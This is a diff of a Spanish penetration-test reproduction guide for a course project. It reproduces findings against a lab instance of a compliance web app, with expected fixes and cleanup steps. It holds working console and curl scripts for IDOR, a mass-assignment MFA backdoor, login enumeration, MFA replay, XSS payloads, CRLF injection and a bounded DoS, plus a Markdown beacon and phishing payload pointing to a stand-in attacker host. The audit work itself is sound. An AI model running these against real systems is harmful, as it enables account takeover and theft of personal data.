@@ -1,31 +1,56 @@
-# Cómo reproducir cada hallazgo como usuario común
+# Cómo reproducir cada hallazgo paso a paso
 
-Esta guía describe los pasos para **verificar** cada hallazgo confirmado, desde la perspectiva
-de un usuario con permisos bajos (rol `DUENO_UNIDAD` o `LECTOR`), sin acceso a la base de datos
-ni al servidor. Es material de reproducción para la cátedra y para el grupo autor; todo se
-probó contra una instancia de laboratorio con datos sintéticos.
+Guía para **verificar** cada hallazgo confirmado desde la perspectiva de un usuario común
+(rol `DUENO_UNIDAD`/`LECTOR`/`RSI`), sin acceso a la base de datos ni al servidor. Todo se probó
+contra una instancia de laboratorio con datos sintéticos. Para los detalles técnicos y la causa
+raíz ver [03-hallazgos-analisis-estatico.md](03-hallazgos-analisis-estatico.md),
+[10-rt03-rt07-rt12.md](10-rt03-rt07-rt12.md) y [09-rt11-osint-gitleaks.md](09-rt11-osint-gitleaks.md).
 
-## Método base: consola del navegador
+> **Ámbito y ética.** Hacerlo solo contra tu propia instancia de laboratorio (Proxmox del informe o
+> el lab de Vagrant en [../lab/](../lab/)), con datos sintéticos. Al terminar, revertir todo (ver
+> [§ Limpieza](#limpieza)).
 
-La cookie de sesión es `__Host-rsi_session`, marcada `HttpOnly`, así que **no** se puede leer
-desde JavaScript. No hace falta: el navegador la adjunta sola en cada pedido al mismo origen.
-Por eso la forma más fiel de reproducir, como "usuario común", es:
+---
 
-1. Iniciar sesión normalmente en la aplicación con la cuenta de rol bajo (p. ej. la de
-   `DUENO_UNIDAD`).
-2. Abrir las herramientas de desarrollo del navegador (F12) → pestaña **Console**.
-3. Ejecutar pedidos con `fetch(...)` usando `credentials: 'include'`. El navegador agrega la
-   cookie de sesión automáticamente, y como el pedido sale del propio origen de la app, también
-   satisface la validación de `Origin` que hace el backend.
+## 0. Preparación
 
-Helper que se usa en los ejemplos (pegar una vez en la consola):
+### 0.1 Entorno
+
+- **Levantar la víctima.** Usar el lab reproducible de [../lab/](../lab/) (`vagrant up` →
+  `https://192.168.56.10:8443`) o la VM del informe. La equivalencia Proxmox ↔ Vagrant está en
+  [../lab/README.md](../lab/README.md): solo cambia la IP/credenciales.
+- **Usuarios.** El seed crea la organización demo y los trabajadores; las cuentas de rol bajo
+  (`DUENO_UNIDAD`, `RSI`, `LECTOR`) se crean desde el panel de administración, vinculadas a esos
+  trabajadores. Credenciales y correos de referencia en
+  [02-credenciales.md](02-credenciales.md) (redactadas).
+- A lo largo de la guía, `<HOST>` es el host:puerto de tu instancia (p. ej. `192.168.56.10:8443`).
+
+### 0.2 Dos formas de ejecutar las pruebas
+
+Cada hallazgo se puede reproducir de dos maneras equivalentes:
+
+- **(A) Consola del navegador** — la más fiel al "usuario común": iniciás sesión normalmente y
+  disparás los pedidos con `fetch`, reutilizando tu cookie de sesión.
+- **(B) Terminal con `curl`** — más cómoda para scripts, timing y concurrencia (la usamos para
+  H4, RT-12). Requiere capturar la cookie de sesión en un archivo.
+
+Elegí una. Ambas se explican abajo.
+
+### 0.3 Autenticación
+
+La cookie de sesión es `__Host-rsi_session`, marcada `HttpOnly`: **no** se lee desde JavaScript,
+pero el navegador la adjunta sola a cada pedido del mismo origen (eso también satisface la
+validación de `Origin` del backend).
+
+**(A) Consola.** Logueate en la app con la cuenta del rol que pide el hallazgo y pegá este helper
+una vez en la consola (F12 → **Console**):
 
 ```js
 const API = location.origin + '/api/v1';
+// Devuelve el status y loguea la respuesta.
 async function api(metodo, ruta, cuerpo) {
   const r = await fetch(API + ruta, {
-    method: metodo,
-    credentials: 'include',
+    method: metodo, credentials: 'include',
     headers: { 'Content-Type': 'application/json' },
     body: cuerpo ? JSON.stringify(cuerpo) : undefined,
   });
@@ -34,242 +59,381 @@ async function api(metodo, ruta, cuerpo) {
   try { console.log(JSON.parse(texto)); } catch { console.log(texto); }
   return r.status;
 }
+// Igual que api(), pero DEVUELVE el JSON (se usa en el reconocimiento).
+async function apiJson(metodo, ruta, cuerpo) {
+  const r = await fetch(API + ruta, {
+    method: metodo, credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: cuerpo ? JSON.stringify(cuerpo) : undefined,
+  });
+  try { return await r.json(); } catch { return null; }
+}
 ```
 
-Para los ejemplos hace falta conocer algunos IDs (de unidades, activos, etc.) que no son de la
-unidad propia del usuario. Un `DUENO_UNIDAD`/`LECTOR` los obtiene de forma legítima navegando
-la app (los endpoints de lectura de organización/unidades no filtran por alcance — ver
-Hallazgo 1), o simplemente mirando las respuestas en la pestaña **Network**.
+**(B) Terminal.** Login guardando la cookie en un *jar* y reutilizándola después:
+
+```bash
+HOST="192.168.56.10:8443"; JAR="$(mktemp)"
+c() { curl -sk -c "$JAR" -b "$JAR" -H "Origin: https://$HOST" "$@"; }
+
+# Rol bajo (sin MFA):
+c -X POST "https://$HOST/api/v1/auth/login" -H 'Content-Type: application/json' \
+  -d '{"correo":"<CORREO_DUENO>","password":"<PASSWORD>"}' -o /dev/null -w "login %{http_code}\n"
+```
+
+Para `ADMINISTRADOR`/`RSI` (MFA obligatorio) hay que agregar `codigoMfa`. Generar el TOTP desde el
+secreto de enrolamiento:
+
+```bash
+python3 -c "
+import base64,hmac,hashlib,struct,time
+s='<SECRETO_TOTP_BASE32>'.upper()
+c=struct.pack('>Q', int(time.time())//30)
+h=hmac.new(base64.b32decode(s),c,hashlib.sha1).digest(); o=h[-1]&15
+print(str((struct.unpack('>I',h[o:o+4])[0]&0x7fffffff)%1000000).zfill(6))"
+# luego: -d '{"correo":"<ADMIN>","password":"<PW>","codigoMfa":"<CODIGO>"}'
+```
+
+### 0.4 Reconocimiento: obtener los IDs que usan las pruebas
+
+Varias pruebas necesitan IDs de recursos **ajenos** a la unidad del usuario. Un rol bajo los
+obtiene de forma legítima (los listados no filtran por alcance — ese es justamente el Hallazgo 9).
+Pegá esto en la consola **logueado como `DUENO_UNIDAD`** y te deja las variables listas:
+
+```js
+// Todas las organizaciones del sistema (H9)
+const orgs = await apiJson('GET', '/organizaciones');
+console.table(orgs.map(o => ({ id: o.id, nombre: o.nombre })));
+
+// Elegí una organización/unidad que NO sea la tuya:
+const orgAjena = orgs[0];                      // ajustá el índice según tu caso
+const unidades = await apiJson('GET', `/organizaciones/${orgAjena.id}/unidades`);
+const unidadAjena = unidades[0];               // una unidad que no administrás
+
+// Un activo ajeno (el listado trae activos fuera de tu alcance):
+const activos = await apiJson('GET', '/seguridad/activos');
+const activoAjeno = activos.find(a => a.unidadOrganizativaId !== unidadAjena.id) || activos[0];
+
+// Un hito de un plan de otra organización:
+const planes = await apiJson('GET', '/cumplimiento/planes');
+const hitos = planes.length ? await apiJson('GET', `/cumplimiento/planes/${planes[0].id}/hitos`) : [];
+const hitoAjeno = hitos[0];
+
+console.log({ orgAjena: orgAjena?.id, unidadAjena: unidadAjena?.id,
+              activoAjeno: activoAjeno?.id, hitoAjeno: hitoAjeno?.id });
+```
+
+A partir de acá, los ejemplos usan esas variables (`orgAjena`, `unidadAjena`, `activoAjeno`,
+`hitoAjeno`). Si preferís la terminal, copiá los IDs que imprime `console.log` y reemplazalos en
+los `curl`.
 
 ---
 
 ## Hallazgo 1 — Edición de unidades/organización fuera del alcance propio
 
-**Rol necesario:** `DUENO_UNIDAD`.
-
-**Pasos (consola):**
+**Rol:** `DUENO_UNIDAD`. **Esperado si estuviera corregido:** `403` en los tres pasos.
 
 ```js
-// 1. Leer una unidad que NO es la propia (debería estar prohibido, pero responde 200)
-await api('GET', '/organizaciones/unidades/<ID_UNIDAD_AJENA>');
-
-// 2. Renombrar esa unidad ajena
-await api('PATCH', '/organizaciones/unidades/<ID_UNIDAD_AJENA>', { nombre: 'prueba-acceso' });
-
-// 3. Modificar el alcance SGSI de toda la organización
-await api('PATCH', '/organizaciones/<ID_ORGANIZACION>', { alcanceSgsi: 'prueba-acceso' });
+// 1. Leer una unidad ajena (debería dar 403, responde 200)
+await api('GET', `/organizaciones/unidades/${unidadAjena.id}`);
+// 2. Renombrar esa unidad ajena  (guardá antes unidadAjena.nombre para revertir)
+await api('PATCH', `/organizaciones/unidades/${unidadAjena.id}`, { nombre: 'prueba-acceso' });
+// 3. Modificar el alcance SGSI de toda la organización ajena
+await api('PATCH', `/organizaciones/${orgAjena.id}`, { alcanceSgsi: 'prueba-acceso' });
 ```
 
-**Resultado vulnerable:** los tres pedidos responden `200`/`201` y el cambio queda guardado.
-**Resultado esperado si estuviera corregido:** `403 Forbidden` en los pasos 1–3, porque el
-usuario solo administra su propia unidad.
-
-> Al terminar, dejar los valores originales (volver a hacer `PATCH` con el nombre/alcance
-> previo) para no ensuciar los datos.
+**Vulnerable:** los tres responden `200`/`201` y el cambio queda guardado.
+**Revertir:** repetir el `PATCH` con el `nombre`/`alcanceSgsi` original (ver [§ Limpieza](#limpieza)).
 
 ---
 
-## Hallazgo 2 — Crear riesgos/incidentes sobre activos de otra unidad (IDOR)
+## Hallazgo 2 / 2b — Crear riesgos/incidentes sobre activos de otra unidad (IDOR)
 
-**Rol necesario:** `DUENO_UNIDAD`.
-
-**Pasos (consola):**
+**Rol:** `DUENO_UNIDAD`. **Esperado si estuviera corregido:** `403` (validar que `activoId` esté en el alcance).
 
 ```js
-// activoAjeno = ID de un activo que NO pertenece a la unidad del usuario
 await api('POST', '/seguridad/riesgos', {
-  activoId: '<ID_ACTIVO_AJENO>', nombre: 'prueba', probabilidad: 3, impacto: 3, estado: 'IDENTIFICADO'
+  activoId: activoAjeno.id, nombre: '[PRUEBA-RT] idor', probabilidad: 3, impacto: 3, estado: 'IDENTIFICADO'
 });
 await api('POST', '/seguridad/incidentes', {
-  activoId: '<ID_ACTIVO_AJENO>', titulo: 'prueba', severidad: 'ALTA'
+  activoId: activoAjeno.id, titulo: '[PRUEBA-RT] idor', severidad: 'ALTA'
 });
 ```
 
-**Resultado vulnerable:** responde `201`; se crea el registro asociado a un activo de otra
-unidad (incluso uno que el usuario no ve en su propio listado de activos).
-**Resultado esperado si estuviera corregido:** `403`, validando que `activoId` pertenezca a una
-unidad dentro del alcance del usuario (como sí hace el `DELETE`, que queda en `403`).
-
-> Para limpiar, pedirle a un administrador que borre los registros de prueba (el `DELETE`
-> propio da 403, justamente por el hallazgo).
+**Vulnerable:** `201`; se crea el registro sobre un activo de otra unidad (y la respuesta devuelve
+datos del activo ajeno). **Revertir:** el `DELETE` propio da `403`, así que pedir a un admin que
+borre los registros `[PRUEBA-RT]`.
 
 ---
 
 ## Hallazgo 2c — Editar/borrar hitos de un plan de otra organización
 
-**Rol necesario:** `DUENO_UNIDAD`.
-
-**Pasos (consola):**
+**Rol:** `DUENO_UNIDAD`. **Esperado:** `403` en `PATCH`/`DELETE`.
 
 ```js
-// hitoAjeno = ID de un hito perteneciente a un plan de otra organización/unidad
-await api('PATCH', '/cumplimiento/hitos/<ID_HITO_AJENO>', { nombre: 'prueba-acceso' });
-await api('DELETE', '/cumplimiento/hitos/<ID_HITO_AJENO>');
+await api('PATCH', `/cumplimiento/hitos/${hitoAjeno.id}`, { nombre: '[PRUEBA-RT] acceso' });
+await api('DELETE', `/cumplimiento/hitos/${hitoAjeno.id}`);
 ```
 
-**Resultado vulnerable:** ambos responden `200`. Nota: crear o listar hitos por la ruta
-`/cumplimiento/planes/<id>/hitos` sí da `403` — la falla está solo en las rutas `/hitos/:id`
-directas (editar y borrar).
-**Resultado esperado si estuviera corregido:** `403` también en `PATCH`/`DELETE` de hitos.
+**Vulnerable:** ambos `200`. (Crear/listar por `/cumplimiento/planes/<id>/hitos` sí da `403` — la
+falla está solo en las rutas directas `/hitos/:id`.) Si vas a probar el `DELETE`, hacelo sobre un
+hito que puedas recrear, o omití ese paso para no perder datos del seed.
 
 ---
 
 ## Hallazgo 2d — Rol RSI accede a datos de otra organización (URCDP)
 
-**Rol necesario:** `RSI`.
-
-**Contexto:** aplica solo si el despliegue aloja **más de una** organización. El rol `RSI` no
-tiene ningún filtro de alcance, así que puede operar sobre cualquier organización del sistema.
-
-**Pasos (consola):**
+**Rol:** `RSI`. **Contexto:** aplica si el despliegue aloja **más de una** organización. **Esperado:** `403`.
 
 ```js
-// orgAjena = ID de una organización que NO es la del RSI
-await api('GET', '/exportaciones/organizaciones/<ID_ORG_AJENA>/urcdp');   // lee bases de datos personales ajenas
+// orgAjena.id = una organización que NO es la del RSI (obtenida en el reconocimiento)
+await api('GET', `/exportaciones/organizaciones/${orgAjena.id}/urcdp`);
 ```
 
-**Resultado vulnerable:** `200` con el contenido completo de las bases de datos personales
-(registro URCDP) de la otra organización; también se pueden modificar con `PUT` sobre
-`/exportaciones/organizaciones/<ID_ORG_AJENA>/urcdp/bases-personales/<fichaId>`.
-**Resultado esperado si estuviera corregido:** `403`, limitando a cada RSI a su propia
-organización. (Este punto depende de la intención de diseño — ver la pregunta abierta en el
-informe de hallazgos.)
+**Vulnerable:** `200` con las bases de datos personales (registro URCDP) de la otra organización;
+también se pueden modificar con `PUT` sobre
+`/exportaciones/organizaciones/${orgAjena.id}/urcdp/bases-personales/<fichaId>`. Es el hallazgo de
+mayor peso regulatorio (Ley 18.331).
 
 ---
 
-## Hallazgo 3 — Un administrador puede escribir campos protegidos de cualquier usuario
+## Hallazgo 3 — Mass assignment: escribir campos protegidos de cualquier usuario
 
-**Rol necesario:** `ADMINISTRADOR` (no es "usuario común", pero se incluye por completitud; es
-el hallazgo de mayor impacto).
-
-> Nota: las cuentas `ADMINISTRADOR` y `RSI` tienen MFA obligatorio, así que para loguearte por
-> API/consola necesitás incluir el campo `codigoMfa` con el código TOTP vigente. Desde la UI,
-> simplemente completás el segundo factor como siempre.
-
-**Pasos (consola):**
+**Rol:** `ADMINISTRADOR` (requiere MFA; ver §0.3). Es el de mayor impacto (backdoor de MFA/contraseña).
 
 ```js
-// Escribir campos que el formulario legítimo nunca envía
+// usuarioObjetivo = ID de cualquier usuario (p. ej. el del LECTOR)
 await api('PATCH', '/auth/usuarios/<ID_USUARIO>', { mfaConfirmado: true });
+// variante backdoor: { mfaSecret: '<semilla base32 conocida>', mfaConfirmado: true }
 ```
 
-**Resultado vulnerable:** `200`. El backend persiste campos como `mfaConfirmado`, `mfaSecret`
-o `passwordHash` que no están en el DTO de actualización, porque el body se pasa crudo a la
-base. La respuesta no muestra esos campos (quedan ocultos por el `select`), pero el cambio se
-guarda. En el laboratorio esto se comprobó consultando la base directamente.
-**Resultado esperado si estuviera corregido:** el backend ignora o rechaza todo campo fuera del
-DTO (`ValidationPipe` con `whitelist`/`forbidNonWhitelisted`), por lo que esos campos no se
-tocan.
+**Vulnerable:** `200`. El backend persiste campos fuera del DTO (`mfaConfirmado`, `mfaSecret`,
+`passwordHash`) porque el body se pasa crudo a la base. La respuesta los oculta por el `select`,
+pero el cambio se guarda — en el laboratorio se verificó consultando la DB:
+
+```bash
+# dentro de la VM (vagrant ssh), inspeccionar el usuario:
+sudo docker exec -it sistema-rsi-postgres psql -U rsi -d rsi \
+  -c "select correo, \"mfaConfirmado\", (\"mfaSecret\" is not null) as tiene_secret from \"Usuario\" where correo='<CORREO>';"
+```
+
+**Revertir:** `PATCH` del mismo usuario a `{ mfaConfirmado: false }` y, en DB, `mfaSecret = NULL`
+(o re-seed). **Esperado si estuviera corregido:** `ValidationPipe` con `whitelist`/`forbidNonWhitelisted` ignora esos campos.
 
 ---
 
 ## Hallazgo 4 — Enumeración de usuarios por tiempo de respuesta
 
-**Rol necesario:** ninguno (se prueba sin autenticarse, en `/auth/login`).
-
-**Pasos:** medir el tiempo de respuesta de dos logins fallidos, uno con un correo que existe y
-otro con uno que no. Desde una terminal:
+**Rol:** ninguno (sin autenticar). **Terminal:**
 
 ```bash
-# Usuario que existe (contraseña incorrecta)
-curl -k -s -o /dev/null -w "%{time_total}\n" -X POST https://<HOST>/api/v1/auth/login \
-  -H 'Content-Type: application/json' -H 'Origin: https://<HOST>' \
+# Correo que EXISTE (password incorrecta) — el backend verifica el hash
+curl -k -s -o /dev/null -w "existe:   %{time_total}s\n" -X POST "https://$HOST/api/v1/auth/login" \
+  -H 'Content-Type: application/json' -H "Origin: https://$HOST" \
   -d '{"correo":"<CORREO_EXISTENTE>","password":"x"}'
-
-# Usuario que no existe
-curl -k -s -o /dev/null -w "%{time_total}\n" -X POST https://<HOST>/api/v1/auth/login \
-  -H 'Content-Type: application/json' -H 'Origin: https://<HOST>' \
+# Correo que NO existe
+curl -k -s -o /dev/null -w "noexiste: %{time_total}s\n" -X POST "https://$HOST/api/v1/auth/login" \
+  -H 'Content-Type: application/json' -H "Origin: https://$HOST" \
   -d '{"correo":"noexiste@ejemplo.com","password":"x"}'
 ```
 
-**Resultado vulnerable:** el correo que existe tarda ~0.5 s (el backend verifica el hash);
-el que no existe, ~0.02 s. La diferencia revela qué correos están registrados.
-**Nota:** nginx limita a 5 intentos/minuto por IP, así que conviene esperar entre pruebas (si
-no, se recibe `429`). Esto hace la enumeración lenta, no imposible.
-**Resultado esperado si estuviera corregido:** ambos casos deben tardar lo mismo (ejecutar un
-hash "señuelo" cuando el usuario no existe).
+**Vulnerable:** el correo existente tarda ~0.5 s; el inexistente, ~0.02 s. **Nota:** nginx limita
+~5 intentos/min por IP (`429`), así que espaciá las pruebas. **Esperado:** tiempos iguales (hash señuelo).
 
 ---
 
-## Hallazgo 4b — Reutilización (replay) de un código MFA
+## Hallazgo 4b — Replay de un código MFA
 
-**Rol necesario:** una cuenta con MFA activado.
+**Rol:** una cuenta con MFA activado. Usar el **mismo** código de 6 dígitos dos veces seguidas
+(dentro del mismo intervalo de ~30 s):
 
-**Pasos:** en el momento de iniciar sesión, usar el mismo código de 6 dígitos de la app de
-autenticación **dos veces seguidas** (dos logins en el mismo intervalo de ~30 s). Se puede
-hacer con dos envíos del formulario de login, o repitiendo el `POST /auth/login` con el mismo
-`codigoMfa`.
+```bash
+COD="<codigo_totp_actual>"
+for i in 1 2; do
+  curl -sk -X POST "https://$HOST/api/v1/auth/login" -H 'Content-Type: application/json' \
+    -H "Origin: https://$HOST" -d "{\"correo\":\"<ADMIN>\",\"password\":\"<PW>\",\"codigoMfa\":\"$COD\"}" \
+    -o /dev/null -w "login $i: %{http_code}\n"
+done
+```
 
-**Resultado vulnerable:** ambos logins tienen éxito (`201`) y se crean dos sesiones válidas.
-**Resultado esperado si estuviera corregido:** el segundo uso del mismo código debe
-rechazarse (registrar el último código/intervalo ya consumido por usuario).
+**Vulnerable:** ambos `201` (dos sesiones válidas con el mismo código). **Esperado:** el segundo uso debe dar error (anti-replay por usuario/intervalo).
 
 ---
 
 ## Hallazgo 9 — Listar todas las organizaciones del sistema
 
-**Rol necesario:** `DUENO_UNIDAD` o `LECTOR`.
+**Rol:** `DUENO_UNIDAD`/`LECTOR`.
 
 ```js
 await api('GET', '/organizaciones');
 ```
 
-**Resultado vulnerable:** devuelve **todas** las organizaciones del sistema (no solo la propia),
-con su nombre, alcance SGSI y perfil. Relevante solo si el despliegue aloja más de una
-organización.
-**Resultado esperado si estuviera corregido:** el listado debería limitarse a la organización
-del usuario.
+**Vulnerable:** devuelve **todas** las organizaciones (nombre, alcance, perfil), no solo la propia. Relevante en multi-organización. **Esperado:** limitar a la organización del usuario.
 
 ---
 
 ## Hallazgo 10 — Crear un proceso "huérfano" sin organización
 
-**Rol necesario:** `DUENO_UNIDAD`.
+**Rol:** `DUENO_UNIDAD`.
 
 ```js
-// Omitir organizacionId a propósito
-await api('POST', '/organizaciones/procesos', { nombre: 'proceso-sin-organizacion' });
+await api('POST', '/organizaciones/procesos', { nombre: '[PRUEBA-RT] proceso-sin-org' });
 ```
 
-**Resultado vulnerable:** responde `201` y crea un proceso con `organizacionId: null`, fuera de
-toda organización. (Enviar un `organizacionId` ajeno sí da `403` — el agujero es **omitirlo**.)
-**Resultado esperado si estuviera corregido:** `400`/`403`, exigiendo una organización dentro
-del alcance del usuario.
-
-> Para limpiar, borrar el proceso creado (un admin puede: `DELETE /organizaciones/procesos/<id>`).
+**Vulnerable:** `201`, crea un proceso con `organizacionId: null`. (Enviar un `organizacionId`
+ajeno sí da `403` — el agujero es **omitirlo**.) **Revertir:** un admin borra el proceso
+(`DELETE /organizaciones/procesos/<id>`).
 
 ---
 
 ## Hallazgo 11 — Auto-aprobar/aceptar un riesgo propio
 
-**Rol necesario:** `DUENO_UNIDAD`.
+**Rol:** `DUENO_UNIDAD`.
 
 ```js
 // riesgoPropio = un riesgo de la unidad del usuario
-await api('PATCH', '/seguridad/riesgos/<ID_RIESGO_PROPIO>', { estado: 'APROBADA', aceptado: true });
+const mios = await apiJson('GET', '/seguridad/riesgos');
+const riesgoPropio = mios[0];
+await api('PATCH', `/seguridad/riesgos/${riesgoPropio.id}`, { estado: 'APROBADA', aceptado: true });
+await api('GET', `/seguridad/riesgos/${riesgoPropio.id}`);   // verificar
 ```
 
-**Resultado vulnerable:** responde `200`; el riesgo queda en estado `APROBADA` y `aceptado:true`
-sin pasar por ningún rol de aprobación (p. ej. `RSI`). Además el campo `estado` admite cualquier
-texto. Verificable con un `GET` posterior del mismo riesgo.
-**Resultado esperado si estuviera corregido:** la aprobación/aceptación debería requerir el rol
-correspondiente, y `estado` debería validarse contra un conjunto cerrado de valores. (Sujeto a
-confirmar cuál es el flujo de aprobación previsto por el grupo.)
+**Vulnerable:** `200`; queda `APROBADA`/`aceptado:true` sin pasar por un rol de aprobación, y
+`estado` admite texto libre. **Revertir:** `PATCH` al estado original. **Esperado:** la aprobación debe exigir el rol correspondiente y `estado` validarse contra un conjunto cerrado.
+
+---
+
+## RT-03 (Markdown injection en exportadores) — **confirmado, medio**
+
+**Rol:** `DUENO_UNIDAD`/`RSI` (cualquiera que pueda crear una política y exportar). La función de
+escape de los exportadores neutraliza `&<>`/CRLF pero **no** la sintaxis Markdown `[]()`.
+
+```js
+// 1. Crear una política con payload Markdown en la descripción
+await api('POST', `/cumplimiento/politicas/${orgAjena.id}`, {
+  titulo: '[PRUEBA-RT] md', estado: 'BORRADOR', version: '1.0',
+  descripcion: 'texto ![x](https://ATACANTE/beacon.png) y [link](https://ATACANTE/phish)'
+});
+// 2. Exportar el documento y observar el payload sin escapar
+await api('GET', `/exportaciones/organizaciones/${orgAjena.id}/politica-seguridad`);
+```
+
+**Vulnerable:** el `![imagen](url)`/`[link](url)` viaja **íntegro** al documento exportado
+(Markdown). Abierto en un visor que renderiza Markdown, la imagen remota actúa como **beacon**
+(exfiltración pasiva / confirmación de apertura) y el link como **phishing** dentro de un documento
+oficial (SoA, política, inventario). **Revertir:** borrar la política `[PRUEBA-RT]`
+(`DELETE /cumplimiento/politicas/<id>`). **Esperado:** escapar también `[]()` o renderizar como texto plano.
+
+---
+
+## RT-04 (XSS persistente) — **descartado con fuzzing activo**
+
+**Rol:** `DUENO_UNIDAD` para plantar; cualquier rol para visualizar. Objetivo: comprobar que el
+payload almacenado **no** se ejecuta.
+
+```js
+// 1. Plantar una batería de payloads en una política
+const xss = `[PRUEBA-RT] <script>alert('xss')</script> <img src=x onerror=alert(document.domain)> <svg onload=alert(1)>`;
+await api('POST', `/cumplimiento/politicas/${orgAjena.id}`, { titulo: xss, descripcion: xss, version: '1.0', estado: 'BORRADOR' });
+```
+
+2. **Verificar en el navegador:** ir a **Cumplimiento → Políticas**, abrir **F12 → Console** y la
+   pestaña **Inspector**, y observar la tarjeta `[PRUEBA-RT]`.
+
+**Resultado (no explotable):** **no** salta ningún `alert()`; en el Inspector el payload figura
+como **nodo de texto** dentro del `<h3>`/`<p>` (los `<` escapados a `&lt;`), no como elementos
+reales. Doble capa: React escapa todo texto interpolado **+** CSP `script-src 'self'` sin
+`unsafe-inline`. El backend guarda verbatim (no sanitiza), pero no hay sink de HTML. Evidencia en
+[evidencia/rt04-xss/](evidencia/rt04-xss/). **Revertir:** borrar la política `[PRUEBA-RT]`.
+
+---
+
+## RT-07 (log injection) — **descartado**
+
+**Rol:** cualquiera. Inyectar CRLF en un query string y revisar el log crudo de nginx:
+
+```bash
+c "https://$HOST/api/v1/seguridad/riesgos?estado=FORJADO%0d%0a<linea-de-log-falsa>" -o /dev/null -w "%{http_code}\n"
+```
+
+Luego, dentro de la VM:
+
+```bash
+sudo docker logs sistema-rsi-frontend 2>&1 | tail -5 | cat -A   # ver caracteres de control
+```
+
+**Resultado (no explotable):** nginx registra el `%0d%0a` **literal, sin decodificar, en una sola
+línea** (no parte el log ni inyecta una entrada falsa). Además el backend no tiene un sink de
+logging de aplicación que reciba el valor. Sin envenenamiento de logs.
+
+---
+
+## RT-11 (OSINT del repositorio) — **sin secretos reales**
+
+**Rol:** acceso al repositorio (no necesita la app). Sobre el clon del código:
+
+```bash
+gitleaks detect --source . --no-banner                 # historial completo
+git log --all -p | grep -nE 'BEGIN .*PRIVATE KEY|AKIA[0-9A-Z]{16}|-----BEGIN'   # verificación manual
+git log --all --name-only --pretty=format: | grep -E '\.env' | sort -u          # .env trackeados
+```
+
+**Resultado:** los hallazgos de gitleaks son falsos positivos (secreto TOTP de prueba RFC 6238,
+ejemplos de documentación); solo `.env.example` quedó trackeado; 0 claves privadas. Detalle en
+[09-rt11-osint-gitleaks.md](09-rt11-osint-gitleaks.md).
+
+---
+
+## RT-12 (DoS acotado del exportador) — **confirmado, acotado a propósito**
+
+**Rol:** `DUENO_UNIDAD`/`RSI`. Los exportadores no paginan (`take`/`skip`). **Terminal:**
+
+```bash
+# 1. Línea base (un export secuencial)
+curl -sk -o /dev/null -w "base: %{time_total}s\n" -b "$JAR" \
+  "https://$HOST/api/v1/exportaciones/organizaciones/<ORG_ID>/inventario-activos"
+
+# 2. 10 exports concurrentes al mismo endpoint (carga ACOTADA — no sostener)
+for i in $(seq 10); do
+  curl -sk -o /dev/null -w "%{time_total}s\n" -b "$JAR" \
+    "https://$HOST/api/v1/exportaciones/organizaciones/<ORG_ID>/inventario-activos" &
+done; wait
+```
+
+**Vulnerable:** la latencia por request se multiplica ~10× bajo concurrencia (≈0.1 s → ≈1 s),
+confirmando contención de recursos. **Acotado a propósito:** no se escaló más para no degradar el
+laboratorio; no se forzó una caída real. **Esperado:** paginación/límite en los exportadores y un
+`limit_req` específico para `/exportaciones/*`.
+
+---
+
+## Limpieza
+
+Revertir **todo** lo generado durante las pruebas, en esta instancia de laboratorio:
+
+- **H1 / H11:** `PATCH` de vuelta a los valores originales (unidad, `alcanceSgsi`, estado del riesgo).
+- **H2 / H2b / RT-03 / RT-04:** borrar los registros `[PRUEBA-RT]` (riesgos, incidentes, políticas).
+  El `DELETE` del propio `DUENO_UNIDAD` puede dar `403` (por el hallazgo); en ese caso borrar con un
+  admin o directamente en la DB.
+- **H3:** restaurar `mfaConfirmado=false` y `mfaSecret=NULL` del usuario tocado.
+- **H10:** borrar el proceso huérfano (`DELETE /organizaciones/procesos/<id>`, con admin).
+- **RT-12:** borrar cualquier activo/unidad sintéticos creados para medir.
+
+Comprobar que el inventario y los listados vuelven al estado del seed. En el lab de Vagrant, la vía
+más limpia ante la duda es `vagrant destroy && vagrant up` (re-seed completo).
 
 ---
 
 ## Comprobaciones negativas (controles que SÍ funcionan)
 
-Para dejar constancia de que no todo está roto, estas pruebas deben **fallar** (y fallan):
+Estas pruebas deben **fallar** (y fallan) — confirman que el problema es acotado:
 
 ```js
-// Un LECTOR no puede escribir nada (ReadOnlyGuard) → 403
-await api('PATCH', '/organizaciones/unidades/<ID>', { nombre: 'x' });
-
-// Un DUENO_UNIDAD no puede auto-promoverse de rol (RolesGuard) → 403
-await api('PATCH', '/auth/usuarios/<ID_PROPIO>', { rol: 'ADMINISTRADOR' });
+await api('PATCH', `/organizaciones/unidades/${unidadAjena.id}`, { nombre: 'x' }); // como LECTOR → 403 (ReadOnlyGuard)
+await api('PATCH', '/auth/usuarios/<ID_PROPIO>', { rol: 'ADMINISTRADOR' });        // como DUENO → 403 (RolesGuard)
+await api('GET',  '/seguridad/activos/<ID_ACTIVO_AJENO>');                          // detalle ajeno → 403 (alcance en GET :id)
 ```
 
-Ambos responden `403`, lo que confirma que la escritura de solo-lectura y la escalada vertical
-de rol están correctamente bloqueadas; el problema es específicamente el **alcance horizontal**
-entre unidades/organizaciones y el mass assignment en la actualización de usuarios.
+`403` en los tres: la escritura de solo-lectura, la escalada vertical de rol y la lectura de detalle
+fuera de alcance están correctamente bloqueadas. El problema es específicamente el **alcance
+horizontal** entre unidades/organizaciones (en creación/IDOR) y el **mass assignment**.
